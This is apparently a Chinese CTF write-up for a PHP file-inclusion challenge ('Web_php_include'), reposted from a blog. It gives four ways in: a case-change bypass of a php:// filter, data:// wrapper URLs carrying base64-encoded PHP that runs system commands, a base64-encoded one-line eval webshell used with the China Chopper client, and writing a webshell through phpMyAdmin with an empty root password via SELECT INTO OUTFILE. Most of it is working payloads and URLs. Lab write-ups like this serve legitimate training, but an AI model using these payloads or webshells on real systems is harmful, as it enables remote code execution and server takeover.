

# Web_php_include
> https://blog.csdn.net/weixin_43818995/article/details/104164700
``` 
打开页面是这样一段代码从代码中得知page中带有php://的都会被替换成空

str_replace()以其他字符替换字符串中的一些字符(区分大小写)

strstr() 查找字符串首次出现的位置。返回字符串剩余部分
```

* 第一种方法
``` 
大小写绕过由于strstr()这个函数是区分大小写的所以我们可以转换成大小写用PHP://input
```

* 第二种方法
``` 
既然过滤了php://的伪协议 我们可以使用其他协议来做这里使用data://伪协议

data://伪协议

php5.2.0起，数据流封装器开始有效，主要用于数据流的读取。如果传入的数据是PHP代码，就会执行代码

使用方法:data://text/plain;base64,xxxx(base64编码后的数据)

<?php system("dir")?> base64编码后使用

http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJkaXIisssKT8%2b  (注意编码后的+号要URL编码)

<?php system("cat fl4gisisish3r3.php")?> base64编码后使用

http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgc3lzdGVtKCJjYXQgZmw0Z2lzaXNpc2gzcjMucGhwIik/Pg==

查看源码得到flag
```

* 第三种方法
``` 
<?php eval($_POST[xiaohua]); ?> base64加密后拼接

http://111.198.29.45:47062/?page=data://text/plain/;base64,PD9waHAgZXZhbCgkX1BPU1RbeGlhb2h1YV0pOyA/Pg==

菜刀连接即可:
```

* 第四种方法
``` 
御剑扫描获得phpmyadmin root 密码空 进入

数据库执行这条命令查看secure_file_priv是否为空，为空则可以写数据 如果是null不能写

SHOW VARIABLES LIKE "secure_file_priv"

linux默认tmp是可写目录 试试写入一句话马 菜刀连接 

SELECT "<?php eval(@$_POST['xiaohua']); ?>"
INTO OUTFILE '/tmp/test1.php'
```
